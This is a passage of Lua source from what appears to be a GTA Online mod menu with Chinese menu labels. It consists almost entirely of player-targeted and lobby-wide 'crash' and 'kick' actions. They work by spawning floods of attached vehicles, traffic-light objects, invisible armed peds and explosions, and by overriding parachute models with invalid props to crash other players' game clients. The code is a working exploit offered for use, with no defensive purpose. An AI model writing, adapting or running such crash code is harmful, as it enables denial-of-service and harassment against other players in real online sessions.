    ENTITY.ATTACH_ENTITY_TO_ENTITY(car_4,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car_5,towtruck2, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car2,towtruck, 0, 0, 0,0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car3,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car4,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car5,towtruck2, 0,0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car6,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car7,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car8,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car9,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car10,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car11,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car12,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car13,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car14,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car15,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car16,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car17,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car18,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(car19,towtruck, 0, 0, 0, 0, 0,0,0, false, true, false, 0, true)
    plauuepos.x = plauuepos.x + 1
    plauuepos.z = plauuepos.z + 1
    for i = 0, 60 do
    towtruck = CreateVehicle(-442313018,plauuepos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(towtruck,true)
    towtruck2 = CreateVehicle(0x1A7FCEFA,plauuepos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(towtruck2,true)
    ENTITY.SET_ENTITY_INVINCIBLE(towtruck,true)
    WIRI_VEHICLE.ATTACH_VEHICLE_TO_TOW_TRUCK(towtruck,towtruck2,false, 0, 0, 0)
    car = CreateVehicle(0xF337AB36,plauuepos,0)
    WIRI_VEHICLE.ATTACH_VEHICLE_TO_TOW_TRUCK(towtruck,car,false, 0, 0, 0)
    end
    car = CreateVehicle(0x432EA949,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car2 = CreateVehicle(0x432EA949,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car3 = CreateVehicle(0xFCFCB68B,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car4 = CreateVehicle(0xFCFCB68B,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car5 = CreateVehicle(0xFCFCB68B,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car6 = CreateVehicle(0xFCFCB68B,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car7 = CreateVehicle(0x1E5E54EA,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car8 = CreateVehicle(0x33B47F96,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car9 = CreateVehicle(0x1E5E54EA,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car10 = CreateVehicle(0x78BC1A3C,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car11 = CreateVehicle(0x78BC1A3C,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car12 = CreateVehicle(0x8125BCF9,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car13 = CreateVehicle(0x9AE6DDA1,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car14 = CreateVehicle(0x9AE6DDA1,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car15 = CreateVehicle(0xAC5DF515,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car16 = CreateVehicle(0xAC5DF515,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car17 = CreateVehicle(0xAC5DF515,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car18 = CreateVehicle(0xAC5DF515,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    car19 = CreateVehicle(0X187D938D,plauuepos,0)
    ENTITY.FREEZE_ENTITY_POSITION(towtruck,true)
    plauuepos = nil
    wait(4500)
    if players.exists(PlayerID) then
    for i = 1, #vehicles do
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicles[i])
    end
    if #vehicles > 30 then
     notification( "[夜幕提示]正在执行崩溃...", colors.black)
    wait(1000)
    STREAMING.REQUEST_MODEL(0x6FACDF31)
    tow_truck_5g_vehicle = CreateVehicle(0x6FACDF31, utilities.offset_coords_forward(ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) + 0, 0, 5, ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED(pid)), 10), 0, true, false)
    ENTITY.SET_ENTITY_INVINCIBLE(tow_truck_5g_vehicle, true)
    ENTITY.SET_ENTITY_VISIBLE(tow_truck_5g_vehicle, false)
    for i = 1, #vehicles do
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicles[i])
    ENTITY.SET_ENTITY_INVINCIBLE(vehicles[i], true)
    ENTITY.SET_ENTITY_VISIBLE(vehicles[i], false)
    end
    for i = 1, #vehicles do
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicles[i])
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicles[i], tow_truck_5g_vehicle, 0, 0,0,0, 0,0,0, true, true, false, 0, false)
    wait(1)
    end
    local time = util.current_time_millis() + 2000
    while time > util.current_time_millis() do
    wait(0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
    for i = 1, #vehicles do
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicles[i])
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehicles[i], 0, 0, 5)
    end
    end
     notification( "言灵*归墟---崩溃结束", colors.black)
    else
     notification( "言灵*归墟---崩溃结束", colors.black)
    end
    else
     notification( "言灵*归墟---崩溃结束", colors.black)
    end
    end)
    menu.action(collapse3, "言灵*IPHONE 15", {"IPHONE15"}, "", function ()
        notification( "请等待5-10秒崩溃进程", colors.black)
        qingtianzhu(PlayerID)
        notification( "IPHONE 15---崩溃结束", colors.black)
    end)
    menu.action(collapse3, "言灵*湿婆业舞", {"yanlingshipoyewu"}, "", function()
           menu.trigger_commands("yanlingfengwangzhitong " .. players.get_name(PlayerID))
           menu.trigger_commands("yanlingzhulong " .. players.get_name(PlayerID))
           menu.trigger_commands("yanlingguixu " .. players.get_name(PlayerID))
           menu.trigger_commands("IPHONE15 " .. players.get_name(PlayerID))
    end)
    collapse4 = menu.list(player_removals, "组合崩溃(4)", {}, "夜幕全新组合崩溃")
    menu.action(collapse4, "IPHONE 12", {"IPHONE12"}, "", function()
      IPHONE12(PlayerID)
        notification( "IPHONE 12---崩溃结束", colors.black)
	end)
    menu.action(collapse4, "IPHONE 13", {"IPHONE13"}, "", function()
        local pCoords<const> = players.get_position(PlayerID)
        local trafficLights = {}
        util.request_model(-655644382) -- traffic lights
        util.request_model(1663218586)
        for i = 1, 20 do
            local object<const> = entities.create_object(-655644382, v3.new(pCoords.x + math.random(-5, 5), pCoords.y + math.random(-5, 5), pCoords.z + math.random(-1, 0)))
            local object1<const> = entities.create_object(1663218586, v3.new(pCoords.x + math.random(-5, 5), pCoords.y + math.random(-5, 5), pCoords.z + math.random(-1, 0)))
            ENTITY.SET_ENTITY_ROTATION(object, 0, 0, math.random(0, 360), 1, true)
            ENTITY.SET_ENTITY_ROTATION(object1, 0, 0, math.random(0, 360), 1, true)
            trafficLights[#trafficLights + 1] = object
            trafficLights[#trafficLights + 1] = object1
        end
        local stopLights = false
        util.create_tick_handler(function()
            if stopLights then
                return false
            end
            ENTITY.SET_ENTITY_TRAFFICLIGHT_OVERRIDE(trafficLights[math.random(1, #trafficLights)], math.random(0, 3))
        end)
        util.request_model(-891462355) -- buffalo
        util.request_model(3253274834) -- buffalo
        local vehicles = {}
        local crashVehicle<const> = entities.create_vehicle(3253274834, pCoords, 0)
        local crashVehicle<const> = entities.create_vehicle(-891462355, pCoords, 0)
        vehicles[#vehicles + 1] = crashVehicle
        VEHICLE.SET_VEHICLE_MOD_KIT(crashVehicle, 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(crashVehicle, "ICRASHU")
        VEHICLE.SET_VEHICLE_MOD(crashVehicle, 34, 3)
        for i = 1, 10 do
            vehicles[#vehicles + 1] = clone(crashVehicle)
        end
        util.yield(500)
        for i = 1, #vehicles do
            entities.delete_by_handle(vehicles[i])
        end
        util.yield(500)
        stopLights = true
        util.yield(500)
        for i = 1, #trafficLights do
            entities.delete_by_handle(trafficLights[i])
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3253274834)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-655644382)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(1663218586)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-891462355)
        notification( "IPHONE 13---崩溃结束", colors.black)
    end)
    menu.action(collapse4, "IPHONE 14", {"IPHONE14"}, "", function()
        notification( "请等待7-15秒崩溃进程", colors.black)
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        menu.trigger_commands("tpmazehelipad")
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)
        util.yield(1000)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(0, 0, 0, 0, 0, 0, 0, true, util.joaat("weapon_heavysniper_mk2"), playerPed, false, true, 100.0)
        menu.trigger_commands("tpmtchiliad")
        menu.trigger_commands("tpmazehelipad")
        notification( "IPHONE 14---崩溃结束", colors.black)
    end)


menu.action(collapse4, "IPHONE 14", {"IPHONE14"}, "", function()
    local getPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
    local setEntityCoords = ENTITY.SET_ENTITY_COORDS
    local setEntityCoordsNoOffset = ENTITY.SET_ENTITY_COORDS_NO_OFFSET
    local self_ped = getPlayerPed(players.user())
    local playerID = PlayerID
    menu.trigger_commands("tpmazehelipad")
    -- 移动玩家坐标
    setEntityCoords(self_ped, -6170, 10837, 40, true, false, false)
    util.yield(1000)
    setEntityCoords(self_ped, -18, 708, 243, true, false, false)
    util.yield(1000)
    setEntityCoords(self_ped, -74, 100, 174, true, false, false)
    util.yield(1000)
    setEntityCoords(self_ped, -101, 100, 374, true, false, false)
    util.yield(1000)
    -- 循环移动玩家坐标
    for i = 1, 2 do
        setEntityCoords(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(900)
        setEntityCoords(self_ped, -18, 708, 243, true, false, false)
        util.yield(900)
        setEntityCoords(self_ped, -74, 100, 174, true, false, false)
        util.yield(900)
        setEntityCoords(self_ped, -101, 100, 374, true, false, false)
        util.yield(1000)
    end
    setEntityCoordsNoOffset(self_ped, 24, 7643.5, 19, true, true, true)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(0, 0, 0, 0, 0, 0, 0, true, util.joaat("weapon_heavysniper_mk2"), playerPed, false, true, 100.0)
    util.yield(1000)
    menu.trigger_commands("tpmtchiliad")
    menu.trigger_commands("tpmazehelipad")
end)


    menu.action(collapse4, "IPHONE PRO MAX PLUS", {"IPHONEPROMAXPLUS"}, "", function()
           menu.trigger_commands("IPHONE12 " .. players.get_name(PlayerID))
           menu.trigger_commands("IPHONE13 " .. players.get_name(PlayerID))
           menu.trigger_commands("IPHONE14 " .. players.get_name(PlayerID))
    end)
    collapse5 = menu.list(player_removals, "崩溃(5)", {}, "夜幕全新崩溃")
    menu.toggle_loop(collapse5, "安全中心崩溃", {""}, "", function()
    notification( "请等待5-10秒崩溃进程", colors.black)
       local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
       local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
	   local coords = ENTITY.GET_ENTITY_COORDS(ped)
   	   local model = util.joaat("banshee")
       local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
       local sb_ped <const> = CreatePed(26,util.joaat("a_c_rat"),pos,0)
       local crash_plane <const> = CreateVehicle(0x9c5e5644,pos,0)
       local time <const> = util.current_time_millis() + 3500
       local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
       local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
       local PED2 = CreatePed(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)
       local PED3 = CreatePed(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)
       local PED4 = CreatePed(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)
       local PED5 = CreatePed(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)
       local PED6 = CreatePed(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)
       local PED7 = CreatePed(26,util.joaat("cs_wade"),TargetPlayerPos, 0)
       request_model(model)
       local vehicle = entities.create_vehicle(model,coords,0)
       pos.x = pos.x + 3
       PED.SET_PED_INTO_VEHICLE(sb_ped,crash_plane,-1)
       PED.SET_PED_INTO_VEHICLE(players.user_ped(players.user()),crash_plane,-1)
       ENTITY.FREEZE_ENTITY_POSITION(crash_plane,true)
       TASK.TASK_OPEN_VEHICLE_DOOR(players.user_ped(players.user()), crash_plane, 9999, -1, 2)
       while time > util.current_time_millis() do
       TASK.TASK_LEAVE_VEHICLE(sb_ped, crash_plane, 0)
       util.yield(1)
       VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
	   ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
	   VEHICLE.SET_VEHICLE_GRAVITY(vehicle, 0)
		local max_mod = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)-1
		VEHICLE.SET_VEHICLE_MOD(vehicle, i, max_mod, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(players.user()),mypos.x+300,mypos.y+700,mypos.z+1500)
        ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(players.user()),true)
        ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
        util.yield(500)
        WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
        WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
        WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
        WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
        WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
        WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
        WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
        util.yield(1500)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(players.user()), mypos.x, mypos.y, mypos.z)
        ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(players.user()),false)
        util.yield(2500)    
      entities.delete_by_handle(PED1)
      entities.delete_by_handle(PED2)
      entities.delete_by_handle(PED3)
      entities.delete_by_handle(PED4)
      entities.delete_by_handle(PED5)
      entities.delete_by_handle(PED6)
      entities.delete_by_handle(PED7)
      entities.delete_by_handle(sb_ped)
      end
        notification( "安全中心崩溃---崩溃结束", colors.black)
    end)  
    


end
-------------------脚本单体选项------------------------
players.on_join(player)
players.dispatch_on_join()
-----------------------结尾-----------------------------

quanjubengkui = menu.list(quanju,"全局踢出/崩溃", {},"崩溃全局~")
menu.divider(quanjubengkui, "全局踢出")
menu.action(quanjubengkui, "踢出战局内所有玩家", {}, "", function () 
    menu.trigger_commands("kickall")
end)
menu.divider(quanjubengkui, "全局崩溃")
    menu.action(quanjubengkui, "人物伞崩全局v1", {}, "崩溃其他玩家游戏", function()
        local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for n = 0 , 3 do
            local object_hash = util.joaat("prop_logpile_06b")
            STREAMING.REQUEST_MODEL(object_hash)
              while not STREAMING.HAS_MODEL_LOADED(object_hash) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    
            local object_hash2 = util.joaat("prop_beach_parasol_03")
            STREAMING.REQUEST_MODEL(object_hash2)
              while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        notification( "崩溃完成", green)
    end)
 
    menu.action(quanjubengkui,"人物伞崩全局V2",{},"崩溃全局",function()
       wudihh()
       notification( "崩溃完成", green)
    end)
    menu.action(quanjubengkui,"人物伞崩全局V3",{},"崩溃全局",function()
       renwusanrnm()
       notification( "崩溃完成", green)
    end)
    menu.action(quanjubengkui, "人物伞崩全局V4", {""}, "强力崩溃", function()
      for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
                                    STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 1117917059
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
end
       notification( "崩溃完成", green)
end)
    menu.action(quanjubengkui,"人物伞崩全局V5",{},"崩溃全局",function()
        rlengzhan()
       notification( "崩溃完成", green)
    end)  
    menu.action(quanjubengkui, "人物伞崩全局V6", {""}, "", function()
for n = 0 , 5 do
    PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    object_hash = 2186304526
                                STREAMING.REQUEST_MODEL(object_hash)
  while not STREAMING.HAS_MODEL_LOADED(object_hash) do
       util.yield()
     end
    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
    util.yield(800)
    for i = 0 , 20 do
    PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    end
    util.yield(800)
    menu.trigger_commands("tpmazehelipad")
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(1)
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
    util.yield(300)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(800)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    bush_hash = 1047645690
                                STREAMING.REQUEST_MODEL(bush_hash)
  while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
       util.yield()
     end
    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
       util.yield(800)
    for i = 0 , 20 do
    PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    end
    util.yield(800)
    menu.trigger_commands("tpfortzancudo")
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(1)
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
    util.yield(300)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(800)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    bush_hash = 3456106952
    STREAMING.REQUEST_MODEL(bush_hash)
while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
util.yield()
end
PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
util.yield(800)
for i = 0 , 20 do
PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
end
util.yield(800)
menu.trigger_commands("tplsia")
PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
util.yield(1)
local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
util.yield(500)
TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
util.yield(1000)
PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
end
notification("崩溃执行结束" ,colors.black)
end)
menu.action(quanjubengkui, "人物伞崩全局V7", {""}, "", function()
notification("开崩" ,colors.black)
for n = 0 , 5 do
    PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    object_hash = 2186304526
                                STREAMING.REQUEST_MODEL(object_hash)
